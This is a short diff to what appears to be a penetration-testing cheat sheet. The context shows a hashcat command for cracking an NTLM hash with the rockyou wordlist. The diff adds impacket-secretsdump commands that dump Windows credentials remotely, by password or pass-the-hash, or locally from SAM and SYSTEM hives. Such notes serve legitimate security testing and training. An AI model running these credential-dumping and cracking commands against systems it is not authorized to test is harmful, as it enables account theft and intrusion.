@@ -98,4 +98,13 @@ or crack the hashes
 ```
  sudo hashcat -m 1000 5d41402abc4b2a76b9719d911017c592 /usr/share/wordlists/rockyou.txt
 ```
+##Impacket-secretsdump
+
+attempt to remotely dump secrets from target windows machine (Credentials required)
+```
+impacket-secretsdump USER@IP -hashes :hash
+impacket-secretsdump USER@IP 
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+ 
 
